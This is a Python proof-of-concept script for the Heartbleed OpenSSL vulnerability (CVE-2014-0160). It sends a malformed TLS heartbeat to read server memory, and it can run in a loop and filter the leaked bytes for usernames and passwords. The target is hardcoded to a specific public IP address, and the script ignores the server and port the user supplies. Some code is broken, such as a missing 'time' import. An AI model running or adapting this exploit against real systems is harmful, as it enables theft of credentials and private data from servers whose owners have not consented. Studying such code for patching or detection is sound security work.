#!/bin/python3
#
# Demo of heartbleed(CVE-2014-0160)
#
# @Author Huang Yuzhong (hyzgog@gmail.com)
# @Reference Jared Stafford (jspenguin@jspenguin.org)
#

import asyncio
import binascii
import struct
import logging
from optparse import OptionParser

def unhexlify(x):
	return binascii.unhexlify(x.replace(' ', '').replace('\n', '').replace('\t', ''))

hello = unhexlify('''
	16 03 02 00  dc 01 00 00 d8 03 02 53
	43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
	bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
	00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
	00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
	c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
	c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
	c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
	c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
	00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
	03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
	00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
	00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
	00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
	00 0f 00 01 01                                  
''')

hb = unhexlify('''
	18 03 02 00 03
	01 40 00
''')

def hexdump(s):
	for b in range(0, len(s), 16):
		lin = [c for c in s[b : b + 16]]
		hxdat = ' '.join('%02X' % c for c in lin)
		pdat = ''.join(chr(c) if 32 <= c <= 126 else '.' for c in lin)
		print( '  %04x: %-48s %s' % (b, hxdat, pdat))

def textdump(s):
	print(''.join(chr(c) for c in s if 32 <= c <= 126 ))

def passdump(s):
	buf = ''.join(chr(c) for c in s if 32 <= c <= 126 )
	left = buf.find('username')
	if left != -1:
		print(buf[left:])

def recvAll(s, length, timeout=5):
	endtime = time.time() + timeout
	rdata = b''
	remain = length
	while remain > 0:
		rtime = endtime - time.time() 
		if rtime < 0:
			break

		data = s.recv(remain)
		# EOF?
		if not data:
			break
		rdata += data
		remain -= len(data)

	return rdata

@asyncio.coroutine
def recvMessage(reader):
	header = yield from reader.read(5)
	if header is None:
		logging.warning('Unexpected EOF receiving record header - server closed connection')
		return None, None, None

	typ, ver, length = struct.unpack('!BHH', header)

	payload = yield from reader.read(length)
	if payload is None:
		logging.warning('Unexpected EOF receiving record payload - server closed connection')
		return None, None, None

	logging.info(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(payload)))
	return typ, ver, payload

@asyncio.coroutine
def bleed(loop):
	reader, writer = yield from asyncio.open_connection('218.244.141.205', 443, loop=loop)
	writer.write(hello)

	while True:
		typ, ver, payload = yield from recvMessage(reader)

		if typ == None:
			logging.error('Server closed connection without sending Server Hello.')
			return

		# Look for server hello done message.
		if typ == 22 and payload[0] == 0x0E:
			break

	logging.info('Sending heartbeat request...')
	writer.write(hb)
	writer.write(hb)

	typ, ver, payload = yield from recvMessage(reader)

	if typ is None:
		logging.error('No heartbeat response received, server likely not vulnerable')

	elif typ == 24:
		logging.info('Received heartbeat response:')
		dump(payload)
		if len(payload) > 3:
			logging.warning('Server returned more data than it should - server is vulnerable!')
		else:
			logging.warning('Server processed malformed heartbeat, but did not return any extra data.')

	elif typ == 21:
		logging.warning('Received alert:')
		dump(payload)
		logging.error('Server returned error, likely not vulnerable')
	else:
		logging.error('Unknown response type')

if __name__ == '__main__':
	optionParser = OptionParser(usage='%prog server [option]', description='Demo of heartbleed(CVE-2014-0160)')
	optionParser.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
	optionParser.add_option('-o', '--output', type='string', default='text', help='Output format [password, text, hex] (default: text)')
	optionParser.add_option('-l', '--loop', action='store_true', default=False, help='Whether loop forever')

	option, arg = optionParser.parse_args()
	if len(arg) < 1:
		optionParser.print_help()
	else:
		if option.output == 'password':
			dump = passdump
			logging.basicConfig(level=logging.CRITICAL)
		elif option.output == 'text':
			dump = textdump
			logging.basicConfig(level=logging.INFO)
		elif option.output == 'hex':
			dump = hexdump
			logging.basicConfig(level=logging.INFO)

		if option.loop:
			while True:
				loop = asyncio.get_event_loop()
				loop.run_until_complete(bleed(loop))
				loop.close()
		else:
			loop = asyncio.get_event_loop()
			loop.run_until_complete(bleed(loop))
			loop.close()
